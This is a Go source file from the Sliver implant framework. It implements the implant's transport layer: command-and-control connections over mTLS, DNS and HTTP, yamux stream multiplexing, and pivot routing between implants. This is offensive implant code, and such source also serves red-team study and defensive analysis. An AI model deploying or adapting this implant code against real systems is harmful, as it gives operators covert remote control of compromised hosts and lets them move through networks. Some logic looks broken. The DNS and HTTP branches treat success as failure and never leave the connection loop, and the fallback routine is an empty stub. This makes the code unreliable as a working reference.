package transports

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"crypto/rand"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/url"
	"strconv"
	"sync"
	"time"

	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/sliver/3rdparty/hashicorp/yamux"
	"github.com/bishopfox/sliver/sliver/3rdparty/ilgooz/bon"
)

// Transport - A wrapper around a physical connection, embedding what is necessary to
// perform connection multiplexing, and RPC layer management around these muxed logical streams.
// This allows to have different RPC-able streams for parallel work on an implant.
// Also, these streams can be used to route any net.Conn traffic.
type Transport struct {
	ID uint64 // A unique ID for this transport.

	// Depending on the underlying protocol stack used by this transport,
	// we might or might not be able to do stream multiplexing. Generally,
	// if IsMux is set to false, it is because the underlying protocol used
	// is not able to yield us a net.Conn object, and therefore the conn below
	// will also be empty.
	IsMux bool

	// conn - A Physical connection initiated by/on behalf of this transport.
	// From this conn will be derived one or more streams for different purposes.
	// This can be a tls.Conn, a tcp.Conn, a smtp.Conn, etc.
	// In the case of TCP/UDP over HTTP (chisel-style), the transport has initiated
	// a connection with a chisel-like server, with specific keep-alive, and has
	// created a SSH-like conn on top of HTTP.
	// This SSH conn would be this net.Conn, and therefore not being a physical connection.
	conn net.Conn

	// Multiplexer - Able to derive stream from the physical conn above. This
	// transport being in the implant and the server being the one "ordering"
	// to mux conns, we are in a server position here.
	Multiplexer *yamux.Session

	// C2 - The logical stream used, by default, to speak RPC with the server.
	// Either setup on top of physical conn, or of a muxed stream. This can
	// be nil when the transport is connected to another implant (here, we are a pivot.)
	C2 *Connection

	// URL is used by Sliver's code for CC servers.
	URL *url.URL

	// Inbound - Streams that have been created upon request of the
	// Transport's other end: the C2 Server, an implant pivot, or reverse traffic.
	// This channel is CONSUMED by the implant's routing system.
	Inbound chan net.Conn

	// Router - For each connection that needs to be forwarded to the other end
	// we use the Router to connect, specify the wished route of the connection, and pipe.
	// Therefore, here the Router is in a client position most of the time.
	Router *bon.Bon
}

// New - Eventually, we should have all supported transport transports being
// instantiated with this function. It will perform all filtering and setup
// according to the complete URI passed as parameter, and classic templating.
func New(url *url.URL) (t *Transport, err error) {
	t = &Transport{
		ID:  newID(),
		URL: url,
	}
	// {{if .Config.Debug}}
	log.Printf("New transport (CC= %s)", url.String())
	// {{end}}
	return
}

// For now we test with an mTLS connection and start everything from here.
func newTransportMTLS(url *url.URL) (t *Transport, err error) {
	// New
	t, err = New(url)

	// Start
	err = t.Start()
	if err != nil {
		return
	}

	return
}

// Start - Launch all components and routines that will handle all specifications above.
func (t *Transport) Start() (err error) {

	connectionAttempts := 0

ConnLoop:
	for connectionAttempts < maxErrors {

		// We might have several transport protocols available, while some
		// of which being unable to stream multiplexing (ex: mTLS + DNS), so
		// we directly set up the C2 RPC layer here when needed, and we will
		// skip the mux part below thanks to an if condition.
		switch t.URL.Scheme {
		// {{if .Config.MTLSc2Enabled}}
		case "mtls":
			// {{if .Config.Debug}}
			log.Printf("Connecting -> %s", t.URL.Host)
			// {{end}}
			lport, err := strconv.Atoi(t.URL.Port())
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[mtls] Error: failed to parse url.Port%s", t.URL.Host)
				// {{end}}
				lport = 8888
			}
			t.conn, err = tlsConnect(t.URL.Hostname(), uint16(lport))
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[mtls] Connection failed %s", err)
				// {{end}}
				connectionAttempts++
			}
			t.IsMux = true // mTLS is mux-compatible.
			break ConnLoop
			// {{end}} - MTLSc2Enabled
		case "dns":
			// {{if .Config.DNSc2Enabled}}
			t.C2, err = dnsConnect(t.URL)
			if err == nil {
				// {{if .Config.Debug}}
				log.Printf("[dns] Connection failed %s", err)
				// {{end}}
				connectionAttempts++
			}
			t.IsMux = false // DNS is NOT mux-compatible.
			// {{end}} - DNSc2Enabled
		case "https":
			fallthrough
		case "http":
			// {{if .Config.HTTPc2Enabled}}
			t.C2, err = httpConnect(t.URL)
			if err == nil {
				// {{if .Config.Debug}}
				log.Printf("[%s] Connection failed %s", t.URL.Scheme, err)
				// {{end}}
				connectionAttempts++
			}
			t.IsMux = false // Custom Sliver HTTP is NOT mux-compatible.
			// {{end}} - HTTPc2Enabled
		}
	}

	// If the underlying protocol stack allows us to do stream mux, set it up.
	// If not, all C2 RPC layer is already set for this transport.
	if t.IsMux {
		// Inbound/outbound streams are initialized
		t.Inbound = make(chan net.Conn, 100)

		t.Multiplexer, err = yamux.Server(t.conn, nil)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[mux] Error setting up Multiplexer server: %s", err)
			// {{end}}
			return t.phyConnFallBack()
		}

		// We start handling inbound/outbound streams in the background.
		// Outbound streams, however, are drectly handled by Bon' routing handlers.
		go t.handleInboundStreams()

		// Add the C2 RPC layer on top of the first muxed stream of the comm.
		t.C2, err = t.NewStreamC2()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error: setting RPC C2: %s", err)
			// {{end}}
			return t.phyConnFallBack()
		}
	}

	// Everything in the transport is set up and running.
	// We now either send a registration envelope, or anything.
	activeConnection = t.C2
	activeC2 = t.URL.String()
	// {{if .Config.Debug}}
	log.Printf("Transport %d set up and running (%s)", t.ID, t.URL)
	// {{end}}
	return
}

// StartFromConn - A net.Conn has been created out of a listener, and we
// setup multiplexing infrastructure around it, without any RPC layer added.
// Usually this function is called because we are here the pivot end:
// we just have to route the traffic back to the C2 server (or next pivot).
func (t *Transport) StartFromConn(conn net.Conn) (err error) {

	// We fill details on this Transport

	// {{if .Config.Debug}}
	log.Printf("New transport from incoming connection (<- %s)", conn.RemoteAddr())
	// {{end}}

	// Inbound/outbound streams are initialized
	t.Inbound = make(chan net.Conn, 100)

	t.Multiplexer, err = yamux.Client(conn, nil)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[mux] Error setting up Multiplexer client: %s", err)
		// {{end}}
	}

	// Initiate first stream, used by remote end as C2 RPC stream.
	// Then add it to inbound streams, which will be routed. Exceptionally,
	// the transport is a client, relatively to another implant.
	stream, err := t.Multiplexer.Open()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[mux] Error opening C2 stream: %s", err)
		// {{end}}
		return
	}
	t.Inbound <- stream // The stream will be routed back to server.
	// {{if .Config.Debug}}
	log.Printf("Transport %d set up and running (%s <- %s)", t.ID, t.conn.LocalAddr(), t.conn.RemoteAddr())
	// {{end}}

	// Finally we handle all inbound/outbound streams in background
	// Outbound streams, however, are drectly handled by Bon' routing handlers.
	go t.handleInboundStreams()

	return

}

// NewStreamC2 - The transports muxes the physical connection, adds a C2 RPC layer onto it,
// starts all request handling goroutines, and returns this connection, if needed.
// This function is used if we want to use this implant's RPC functionality concurrently.
func (t *Transport) NewStreamC2() (c2 *Connection, err error) {

	// {{if .Config.Debug}}
	log.Printf("[mux] Waiting for CC to open C2 stream...")
	// {{end}}

	// We wait for the first stream being instantiated over the conn, otherwise we timeout
	select {
	case stream := <-t.Inbound:
		// Get net.Conn stream. This stream is not tracked by any mean latter on. For now only...
		c2 = &Connection{
			Send:    make(chan *pb.Envelope),
			Recv:    make(chan *pb.Envelope),
			ctrl:    make(chan bool),
			tunnels: &map[uint64]*Tunnel{},
			mutex:   &sync.RWMutex{},
			once:    &sync.Once{},
			IsOpen:  true,
			cleanup: func() {
				// {{if .Config.Debug}}
				log.Printf("[mux] lost stream, cleaning up RPC...")
				// {{end}}
				close(c2.Send)
				close(c2.Recv)
				// In sliver we close the physical conn.
				// Here we close the logical stream only.
				stream.Close()
			},
		}

		go func() {
			defer c2.Cleanup()
			for envelope := range c2.Send {
				connWriteEnvelope(stream, envelope)
			}
		}()

		go func() {
			defer c2.Cleanup()
			for {
				envelope, err := connReadEnvelope(stream)
				if err == io.EOF {
					break
				}
				if err == nil {
					c2.Recv <- envelope
				}
			}
		}()

		// {{if .Config.Debug}}
		log.Printf("Done creating RPC C2 stream.")
		// {{end}}

	case <-time.After(defaultNetTimeout):
		return nil, errors.New("timed out waiting muxed stream for RPC C2 layer")
	}
	return
}

// Stop - Gracefully shutdowns all components of this transport.
// The force parameter is used in case we have a mux transport, and
// that we want to kill it even if there are pending streams in it.
func (t *Transport) Stop(force bool) (err error) {

	if t.IsMux {
		activeStreams := t.Multiplexer.NumStreams()

		// If there is an active C2, there is at least one open stream,
		// that we do not count as "important" when stopping the Transport.
		if (t.C2 != nil && activeStreams > 1) || (t.C2 == nil && activeStreams > 0) && !force {
			return fmt.Errorf("Cannot stop transport: %d streams still opened", activeStreams)
		}

		// {{if .Config.Debug}}
		log.Printf("[mux] closing all muxed streams")
		// {{end}}
		err = t.Multiplexer.GoAway()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[mux] Error sending GoAway: %s", err)
			// {{end}}
		}
		err = t.Multiplexer.Close()
		// {{if .Config.Debug}}
		log.Printf("[mux] Error closing session: %s", err)
		// {{end}}
	}

	// Just check the physical connection is not nil and kill it if necessary.
	if t.conn != nil {
		// {{if .Config.Debug}}
		log.Printf("killing physical connection (%s  ->  %s", t.conn.LocalAddr(), t.conn.RemoteAddr())
		// {{end}}
		return t.conn.Close()
	}

	// {{if .Config.Debug}}
	log.Printf("Transport closed (%s)", activeC2)
	// {{end}}
	return
}

// handleInboundStreams - A goroutine used to mux the connection in the background,
// each time the client (Sliver C2 server) asks for a new separate stream.
// These streams will be handled by the implant routing system.
func (t *Transport) handleInboundStreams() {

	defer func() {
		close(t.Inbound)
		// {{if .Config.Debug}}
		log.Printf("[mux] Stopped processing inbound streams: ")
		// {{end}}
	}()

	// {{if .Config.Debug}}
	log.Printf("[mux] Starting inbound stream handling in background...")
	// {{end}}
	for {
		select {
		default:
			stream, err := t.Multiplexer.Accept()
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[mux] Error accepting C2 stream: %s", err)
				// {{end}}
				return
			}
			// {{if .Config.Debug}}
			log.Printf("[mux] Inbound stream: muxing conn")
			// {{end}}
			t.Inbound <- stream

		case <-t.Multiplexer.CloseChan():
			return
		}
	}
}

// HandleRouteStream - The transport is asked to route a stream given a route ID.
// This function is called by Bon' routing handlers, once they have the routeID and the conn.
func (t *Transport) HandleRouteStream(routeID uint32, src net.Conn) (err error) {
	// {{if .Config.Debug}}
	log.Printf("[route] routing connection (ID: %d, Dest: %s)", routeID, src.RemoteAddr())
	// {{end}}

	var route bon.Route = bon.Route(routeID)
	dst, err := t.Router.Connect(route)

	// {{if .Config.Debug}}
	log.Printf("[mux] Outbound stream: muxing conn and piping")
	// {{end}}

	transport(src, dst)
	// go transport(src, dst)
	return
}

// In case we failed to use multiplexing infrastructure, we call here
// to downgrade to RPC over the transport's physical connection.
func (t *Transport) phyConnFallBack() (err error) {
	// {{if .Config.Debug}}
	log.Printf("[mux] falling back on RPC around physical conn")
	// {{end}}

	// First make sure all mux code is cleanup correctly.
	t.IsMux = false

	// Wrap RPC layer around physical conn here.

	return
}

// IsRouting - The transport checks if it is routing traffic that does not originate from this implant.
func (t *Transport) IsRouting() bool {

	if t.IsMux {
		activeStreams := t.Multiplexer.NumStreams()
		// If there is an active C2, there is at least one open stream,
		// that we do not count as "important" when stopping the Transport.
		if (t.C2 != nil && activeStreams > 1) || (t.C2 == nil && activeStreams > 0) {
			return true
		}
		// Else we don't have any non-implant streams.
		return false
	}
	// If no mux, no routing.
	return false
}

func transport(rw1, rw2 io.ReadWriter) error {
	errc := make(chan error, 1)
	go func() {
		errc <- copyBuffer(rw1, rw2)
	}()

	go func() {
		errc <- copyBuffer(rw2, rw1)
	}()

	err := <-errc
	if err != nil && err == io.EOF {
		err = nil
	}
	return err
}

func copyBuffer(dst io.Writer, src io.Reader) error {
	buf := lPool.Get().([]byte)
	defer lPool.Put(buf)

	_, err := io.CopyBuffer(dst, src, buf)
	return err
}

var (
	sPool = sync.Pool{
		New: func() interface{} {
			return make([]byte, smallBufferSize)
		},
	}
	mPool = sync.Pool{
		New: func() interface{} {
			return make([]byte, mediumBufferSize)
		},
	}
	lPool = sync.Pool{
		New: func() interface{} {
			return make([]byte, largeBufferSize)
		},
	}
)

var (
	tinyBufferSize   = 512
	smallBufferSize  = 2 * 1024  // 2KB small buffer
	mediumBufferSize = 8 * 1024  // 8KB medium buffer
	largeBufferSize  = 32 * 1024 // 32KB large buffer
)

func newID() uint64 {
	randBuf := make([]byte, 8)
	rand.Read(randBuf)
	return binary.LittleEndian.Uint64(randBuf)
}
